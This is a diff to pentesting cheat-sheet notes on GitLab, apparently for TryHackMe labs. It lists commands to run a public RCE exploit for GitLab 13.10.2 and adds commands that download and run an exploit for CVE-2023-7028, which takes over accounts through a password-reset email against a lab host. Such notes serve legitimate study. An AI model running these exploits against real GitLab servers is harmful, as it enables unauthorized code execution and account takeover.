@@ -374,12 +374,21 @@ $ ffuf -u 'URL/FUZZ' -w wordlist -mc 200,301
 
 #### Well-known CVEs
 
-Gitlab 13.10.2 RCE:
+* Gitlab 13.10.2 RCE:
 
 ```shell!
 $ sudo apt install djvulibre-bin
 $ searchsploit -p 49951
 $ python3 49951.py -u xxx -p xxx -t URL -c 'command'
+```
+
+[![gitlabcve20237028](../../../cybersecurity/_badges/thm-p/gitlabcve20237028.svg)](https://tryhackme.com/r/room/gitlabcve20237028)
+
+* [CVE-2023-7028](https://nvd.nist.gov/vuln/detail/CVE-2023-7028): an issue in password reset allowed any users to inject an email and receive a copy of the password reset mail.
+
+```shell!
+$ wget https://raw.githubusercontent.com/Vozec/CVE-2023-7028/main/CVE-2023-7028.py
+$ python CVE-2023-7028.py -u http://gitlab.thm:8000 -t target@domain # and mail sent to temporary email platform
 ```
 </div></div>
 
